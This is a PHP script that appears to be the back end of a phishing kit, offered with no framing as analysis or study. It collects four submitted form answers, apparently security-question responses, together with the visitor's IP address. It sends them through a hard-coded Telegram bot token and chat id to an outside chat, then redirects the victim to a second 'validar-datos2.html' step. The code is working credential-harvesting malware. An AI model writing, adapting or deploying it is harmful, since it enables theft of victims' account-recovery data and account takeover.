<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "5470620052:AAERj1FAexvHv9QuZR3pjRH0PUkXfZCX0oE";
$id = "858124660";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
resp1: ".$_POST['sqa']."
resp2: ".$_POST['sq2']."
resp3: ".$_POST['sq3']."
resp4: ".$_POST['sq4']."
IP: ".$userp."
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);

////////////////////



	if(isset($_POST['sqa']) &&($_POST['sq2']) &&($_POST['sq3']) &&($_POST['sq4']) ){

    

header ('location:validar-datos2.html');

	}
?>
